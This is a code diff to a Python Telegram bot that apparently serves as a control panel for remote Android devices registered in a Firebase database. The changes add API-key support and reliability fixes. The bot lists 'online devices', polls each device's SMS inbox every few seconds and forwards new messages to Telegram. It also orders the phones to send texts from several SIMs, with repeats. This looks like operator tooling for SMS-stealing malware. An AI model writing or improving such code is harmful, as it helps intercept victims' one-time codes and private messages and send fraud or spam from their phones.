@@ -582,26 +582,38 @@ def _fwd_kb(uid:int,d:dict):
 # ══════════════════════════════════════════════
 #  FIREBASE
 # ══════════════════════════════════════════════
-async def fb_get(base:str, path:str) -> dict:
-    url=base.rstrip("/")+path
+def _fb_url(base:str, path:str, api_key:str|None=None) -> str:
+    base=(base or "").strip().rstrip("/")
+    if base.endswith(".json"): base=base[:-5]
+    url=base+"/"+path.lstrip("/")
+    if api_key:
+        url += ("&" if "?" in url else "?") + "key=" + str(api_key).strip()
+    return url
+
+async def fb_get(base:str, path:str, api_key:str|None=None):
+    url=_fb_url(base,path,api_key)
     try:
         async with aiohttp.ClientSession() as s:
-            async with s.get(url,timeout=aiohttp.ClientTimeout(total=8)) as r:
-                if r.status==200:
-                    txt=(await r.text()).strip()
-                    return {} if txt=="null" else json.loads(txt)
-    except Exception as e: log.error(f"fb_get {url}: {e}")
+            async with s.get(url,timeout=aiohttp.ClientTimeout(total=10)) as r:
+                txt=(await r.text()).strip()
+                if 200<=r.status<300:
+                    if not txt or txt=="null": return {}
+                    data=json.loads(txt)
+                    return data if isinstance(data,(dict,list)) else {}
+                log.error("fb_get HTTP %s %s: %s",r.status,url,txt[:250])
+    except Exception as e: log.error("fb_get %s: %s",url,e)
     return {}
 
-async def fb_put(base:str, path:str, payload:dict) -> bool:
-    url=base.rstrip("/")+path
+async def fb_put(base:str, path:str, payload:dict, api_key:str|None=None) -> bool:
+    url=_fb_url(base,path,api_key)
     for i in range(3):
         try:
             async with aiohttp.ClientSession() as s:
                 async with s.put(url,json=payload,
-                                 timeout=aiohttp.ClientTimeout(total=6)) as r:
+                                 timeout=aiohttp.ClientTimeout(total=8)) as r:
                     if 200<=r.status<300: return True
-        except Exception as e: log.error(f"fb_put {i+1}: {e}")
+                    log.error("fb_put HTTP %s %s",r.status,url)
+        except Exception as e: log.error("fb_put %s attempt %s: %s",url,i+1,e)
         await asyncio.sleep(0.5*(i+1))
     return False
 
@@ -609,11 +621,11 @@ def dev_online(dd:dict)->bool:
     return any([dd.get("isOnline"),dd.get("online"),dd.get("connected"),
                 dd.get("status") in ("online","active",True,1)])
 
-async def send_via_fb(fb:str,dev:str,sim:int,to:str,msg:str)->bool:
+async def send_via_fb(fb:str,dev:str,sim:int,to:str,msg:str,api_key:str|None=None)->bool:
     return await fb_put(fb,f"/clients/{dev}/webhookEvent/sendSms.json",{
         "from":sim,"to":to.strip(),"message":msg.strip(),
         "isSended":False,"timestamp":int(time.time())
-    })
+    },api_key)
 
 # ══════════════════════════════════════════════
 #  SMS PARSER
@@ -720,11 +732,13 @@ async def _forward_text(bot:Bot, targets:list, text:str):
 async def _do_send(bot:Bot, uid:int, to:str, text:str):
     d=load(); u=usr(uid,d); ac=u.get("active",{})
     fb=ac.get("fb_url"); dev=ac.get("device_id")
+    api_key=next((x.get("api_key","") for x in u.get("firebases",[])
+                  if x.get("url")==fb),"")
     sims=ac.get("sims",[0]) or [0]; rpt=max(1,int(ac.get("repeat",1)))
 
     # Dispatch every SIM/repeat request concurrently instead of waiting for
     # each Firebase request one by one.
-    jobs=[send_via_fb(fb,dev,sim,to,text) for _ in range(rpt) for sim in sims]
+    jobs=[send_via_fb(fb,dev,sim,to,text,api_key) for _ in range(rpt) for sim in sims]
     results=await asyncio.gather(*jobs, return_exceptions=True)
     ok=sum(result is True for result in results)
     fail=len(results)-ok
@@ -756,6 +770,8 @@ async def _do_send(bot:Bot, uid:int, to:str, text:str):
 async def monitor_worker(bot:Bot, uid:int):
     d=load(); u=usr(uid,d); ac=u.get("active",{})
     fb=ac.get("fb_url"); dev=ac.get("device_id")
+    api_key=next((x.get("api_key","") for x in u.get("firebases",[])
+                  if x.get("url")==fb),"")
     if uid not in _seen: _seen[uid]=set()
     log.info(f"Monitor START uid={uid} dev={dev}")
     try:
@@ -766,7 +782,7 @@ async def monitor_worker(bot:Bot, uid:int):
     while True:
         try:
             await asyncio.sleep(4)
-            inbox=await fb_get(fb,f"/clients/{dev}/inbox.json")
+            inbox=await fb_get(fb,f"/clients/{dev}/inbox.json",api_key)
             for mid,mdata in (inbox or {}).items():
                 if mid in _seen[uid]: continue
                 _seen[uid].add(mid)
@@ -814,9 +830,13 @@ def make_zip()->bytes:
 # ══════════════════════════════════════════════
 #  HELPER UTILS
 # ══════════════════════════════════════════════
-async def sedit(cq:CallbackQuery, text:str, markup=None):
-    try: await cq.message.edit_text(text,reply_markup=markup,parse_mode="HTML")
-    except TelegramBadRequest: pass
+async def sedit(cq:CallbackQuery, text:str, markup=None, **kwargs):
+    try:
+        await cq.message.edit_text(
+            text, reply_markup=markup, parse_mode=kwargs.get("parse_mode", "HTML")
+        )
+    except TelegramBadRequest as e:
+        log.debug("message edit skipped: %s", e)
 
 def _add_timed(uid2:int, exp, by:int, d:dict):
     d.setdefault("timed_users",{})[str(uid2)]={"expires":exp,"added_by":by,"added_at":int(time.time())}
@@ -825,8 +845,13 @@ async def _wiz_fetch_devices(bot, uid:int, fb_url:str, fb_id:str, target):
     is_msg=isinstance(target,Message)
     reply=target.answer if is_msg else target.message.answer
     wait=await reply("⏳ Fetching online devices…")
-    devs=await fb_get(fb_url,"/clients.json")
-    online={k:v for k,v in devs.items() if dev_online(v)}
+    d=load(); u=usr(uid,d)
+    fb_entry=next((x for x in u.get("firebases",[]) if str(x.get("id"))==str(fb_id)),{})
+    api_key=fb_entry.get("api_key") or ""
+    devs=await fb_get(fb_url,"/clients.json",api_key)
+    if isinstance(devs,list):
+        devs={str(i):v for i,v in enumerate(devs) if isinstance(v,dict)}
+    online={k:v for k,v in devs.items() if isinstance(v,dict) and dev_online(v)}
     try: await wait.delete()
     except: pass
     if not online:
@@ -902,11 +927,12 @@ async def handle_join_request(update: ChatJoinRequest):
 # ══════════════════════════════════════════════
 @R.message(W.fb_url)
 async def f_fb_url(msg:Message, state:FSMContext):
-    d=load(); uid=msg.from_user.id; text=msg.text.strip()
-    if not text.startswith("http"):
+    d=load(); uid=msg.from_user.id; text=(msg.text or "").strip().rstrip("/")
+    if not text.startswith(("http://", "https://")):
         await msg.answer("❌ URL must start with <code>https://</code>",parse_mode="HTML"); return
+    if text.endswith(".json"): text=text[:-5]
     fsmd=await state.get_data()
-    await state.update_data(**fsmd, wiz_fb_url_temp=text.rstrip("/"))
+    await state.update_data(**fsmd, wiz_fb_url_temp=text)
     await state.set_state(W.fb_api_key)
     await msg.answer(
         "✅ Firebase URL save!\n\n"
@@ -919,7 +945,11 @@ async def f_fb_api_key(msg:Message, state:FSMContext):
     d=load(); uid=msg.from_user.id; api_key=msg.text.strip()
     fsmd=await state.get_data()
     fb_url=fsmd.get("wiz_fb_url_temp","")
-    u=usr(uid,d); fid=str(int(time.time()))
+    if not fb_url:
+        await msg.answer("❌ Firebase URL session missing. Wizard dobara start karo.")
+        await state.clear(); return
+    u=usr(uid,d); fid=str(time.time_ns())
+    u["firebases"]=[x for x in u.get("firebases",[]) if x.get("url")!=fb_url]
     u["firebases"].append({"id":fid,"url":fb_url,"api_key":api_key})
     save(d); await state.clear()
     if fsmd.get("wizard"):
@@ -1180,6 +1210,10 @@ async def f_fj_add(msg:Message, state:FSMContext):
 # ══════════════════════════════════════════════
 @R.callback_query()
 async def cb(cq:CallbackQuery, state:FSMContext):
+    # Acknowledge immediately so Telegram does not keep the button spinner
+    # while Firebase/network work is running.
+    try: await cq.answer()
+    except Exception: pass
     d=load(); uid=cq.from_user.id; c=cq.data
     if not can_use(uid,d): await cq.answer("🚫 Access denied.",show_alert=True); return
     u=usr(uid,d); log.debug(f"CB uid={uid} c={c}")
@@ -1579,7 +1613,8 @@ async def cb(cq:CallbackQuery, state:FSMContext):
 
     elif c=="<i>noop</i>": pass
 
-    await cq.answer()
+    try: await cq.answer()
+    except Exception: pass
 
 # ══════════════════════════════════════════════
 #  GROUP/CHANNEL SMS HANDLER
